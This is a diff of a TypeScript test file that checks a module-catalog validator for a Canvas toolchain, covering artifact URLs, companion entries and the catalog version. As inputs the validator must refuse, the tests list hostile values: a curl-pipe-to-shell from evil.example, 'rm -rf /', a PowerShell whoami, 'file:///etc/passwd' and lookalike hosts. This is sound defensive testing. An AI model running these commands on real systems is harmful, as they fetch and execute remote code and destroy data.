@@ -10,11 +10,18 @@ import {
 
 const GOOD_ENTRY = {
   id: 'announcements', name: 'Announcements Auditor', description: 'Audit scheduled announcements.',
-  version: '1.0.0', minHostVersion: '2.0.0',
-  artifactUrl: 'https://github.com/Ryfter/canvas-toolchain/releases/download/module-announcements-v1.0.0/module-announcements-1.0.0.mjs',
+  version: '1.1.0', minHostVersion: '2.1.0',
+  artifactUrl: 'https://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/modules/announcements/1.1.0/announcements-1.1.0.mjs',
   sha256: 'a'.repeat(64), sizeBytes: 1234,
 };
-const GOOD_CATALOG = { catalogVersion: SUPPORTED_CATALOG_VERSION, modules: [GOOD_ENTRY] };
+const GOOD_COMPANION = {
+  id: 'canvas-backup', name: 'Canvas Backup',
+  summary: 'Downloads a complete local archive of a Canvas course.',
+  whyYouWantIt: 'The toolchain reads a Canvas Backup archive as the start of the pipeline. It also works on its own.',
+  url: 'https://github.com/Ryfter/Canvas-Download',
+  worksWithoutToolchain: true,
+};
+const GOOD_CATALOG = { catalogVersion: SUPPORTED_CATALOG_VERSION, modules: [GOOD_ENTRY], companions: [GOOD_COMPANION] };
 
 function fakeFetch(status: number, body: unknown): typeof fetch {
   return (async () => new Response(JSON.stringify(body), { status })) as unknown as typeof fetch;
@@ -38,51 +45,108 @@ describe('validateCatalog', () => {
     expect(validateCatalog(GOOD_CATALOG).modules[0].id).toBe('announcements');
   });
   it('refuses a newer catalogVersion with CATALOG_VERSION_UNSUPPORTED', () => {
-    expect(() => validateCatalog({ ...GOOD_CATALOG, catalogVersion: 2 }))
+    expect(() => validateCatalog({ ...GOOD_CATALOG, catalogVersion: 3 }))
       .toThrowError(expect.objectContaining({ code: 'CATALOG_VERSION_UNSUPPORTED' }));
   });
   it('refuses entries missing required fields or with a malformed sha256', () => {
     const bad = { ...GOOD_ENTRY, sha256: 'nothex' };
-    expect(() => validateCatalog({ catalogVersion: 1, modules: [bad] }))
+    expect(() => validateCatalog({ catalogVersion: 2, modules: [bad] }))
       .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
     const missing = { ...GOOD_ENTRY } as Record<string, unknown>;
     delete missing.artifactUrl;
-    expect(() => validateCatalog({ catalogVersion: 1, modules: [missing] }))
+    expect(() => validateCatalog({ catalogVersion: 2, modules: [missing] }))
       .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
   });
   it('ignores unknown fields (forward compatibility)', () => {
     const entry = { ...GOOD_ENTRY, futureField: 'ok' };
-    expect(validateCatalog({ catalogVersion: 1, modules: [entry], futureTop: true }).modules).toHaveLength(1);
+    expect(validateCatalog({ catalogVersion: 2, modules: [entry], futureTop: true }).modules).toHaveLength(1);
   });
   it('refuses an id that does not match the module-id format', () => {
     const bad = { ...GOOD_ENTRY, id: 'Bad_ID' };
-    expect(() => validateCatalog({ catalogVersion: 1, modules: [bad] }))
+    expect(() => validateCatalog({ catalogVersion: 2, modules: [bad] }))
       .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
-  });
-  it('refuses an artifactUrl outside this repo\'s GitHub Releases (#121)', () => {
-    for (const artifactUrl of [
-      'https://evil.example/m.mjs',
-      'http://github.com/Ryfter/canvas-toolchain/releases/download/x/m.mjs',
-      'https://github.com/SomeoneElse/canvas-toolchain/releases/download/x/m.mjs',
-      'https://github.com/Ryfter/other-repo/releases/download/x/m.mjs',
-    ]) {
-      const bad = { ...GOOD_ENTRY, artifactUrl };
-      expect(() => validateCatalog({ catalogVersion: 1, modules: [bad] }))
-        .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
-    }
   });
   it('refuses non-finite, non-integer, non-positive, or oversized sizeBytes (#125)', () => {
     for (const sizeBytes of [NaN, Infinity, -Infinity, 0, -1, 1.5, 1e15, MAX_ARTIFACT_BYTES + 1]) {
       const bad = { ...GOOD_ENTRY, sizeBytes };
-      expect(() => validateCatalog({ catalogVersion: 1, modules: [bad] }))
+      expect(() => validateCatalog({ catalogVersion: 2, modules: [bad] }))
         .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
     }
     const atCeiling = { ...GOOD_ENTRY, sizeBytes: MAX_ARTIFACT_BYTES };
-    expect(validateCatalog({ catalogVersion: 1, modules: [atCeiling] }).modules).toHaveLength(1);
+    expect(validateCatalog({ catalogVersion: 2, modules: [atCeiling] }).modules).toHaveLength(1);
   });
   it('refuses duplicate ids across entries, naming the id', () => {
-    expect(() => validateCatalog({ catalogVersion: 1, modules: [GOOD_ENTRY, { ...GOOD_ENTRY }] }))
+    expect(() => validateCatalog({ catalogVersion: 2, modules: [GOOD_ENTRY, { ...GOOD_ENTRY }] }))
       .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID', message: expect.stringContaining(GOOD_ENTRY.id) }));
+  });
+});
+
+describe('validateCatalog — artifact host (v2)', () => {
+  it('refuses an artifactUrl outside the repo modules directory on raw.githubusercontent.com', () => {
+    for (const artifactUrl of [
+      'https://evil.example/m.mjs',
+      'http://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/modules/a/1.0.0/a-1.0.0.mjs',
+      'https://raw.githubusercontent.com/SomeoneElse/canvas-toolchain/main/modules/a/1.0.0/a-1.0.0.mjs',
+      'https://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/scripts/evil.mjs',
+      // The v2.0 hosting scheme is no longer accepted:
+      'https://github.com/Ryfter/canvas-toolchain/releases/download/module-announcements-v1.1.0/module-announcements-1.1.0.mjs',
+    ]) {
+      expect(() => validateCatalog({ ...GOOD_CATALOG, modules: [{ ...GOOD_ENTRY, artifactUrl }] }))
+        .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
+    }
+  });
+});
+
+describe('validateCatalog — companions', () => {
+  it('accepts a well-formed companion and defaults the array to empty when absent', () => {
+    expect(validateCatalog(GOOD_CATALOG).companions[0].id).toBe('canvas-backup');
+    expect(validateCatalog({ catalogVersion: 2, modules: [GOOD_ENTRY] }).companions).toEqual([]);
+  });
+
+  it('refuses any field outside the permitted set — the catalog carries no executable payload', () => {
+    for (const extra of [
+      { installCommand: 'curl https://evil.example/x.sh | sh' },
+      { script: 'rm -rf /' },
+      { cmd: 'powershell -c whoami' },
+      { exec: 'node evil.js' },
+      { artifactUrl: 'https://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/modules/x/1.0.0/x-1.0.0.mjs' },
+    ]) {
+      expect(() => validateCatalog({ ...GOOD_CATALOG, companions: [{ ...GOOD_COMPANION, ...extra }] }))
+        .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
+    }
+  });
+
+  it('refuses a companion url that is not https on github.com', () => {
+    for (const url of [
+      'http://github.com/Ryfter/Canvas-Download',
+      'https://evil.example/Canvas-Download',
+      'https://github.com.evil.example/x',
+      'file:///etc/passwd',
+    ]) {
+      expect(() => validateCatalog({ ...GOOD_CATALOG, companions: [{ ...GOOD_COMPANION, url }] }))
+        .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
+    }
+  });
+
+  it('refuses a companion missing a required field', () => {
+    const missing = { ...GOOD_COMPANION } as Record<string, unknown>;
+    delete missing.whyYouWantIt;
+    expect(() => validateCatalog({ ...GOOD_CATALOG, companions: [missing] }))
+      .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
+  });
+
+  it('refuses an id shared between a module and a companion', () => {
+    const clash = { ...GOOD_COMPANION, id: 'announcements' };
+    expect(() => validateCatalog({ ...GOOD_CATALOG, companions: [clash] }))
+      .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID', message: expect.stringContaining('announcements') }));
+  });
+});
+
+describe('validateCatalog — version', () => {
+  it('accepts catalogVersion 2 and refuses 3', () => {
+    expect(validateCatalog({ ...GOOD_CATALOG, catalogVersion: 2 }).catalogVersion).toBe(2);
+    expect(() => validateCatalog({ ...GOOD_CATALOG, catalogVersion: 3 }))
+      .toThrowError(expect.objectContaining({ code: 'CATALOG_VERSION_UNSUPPORTED' }));
   });
 });
 
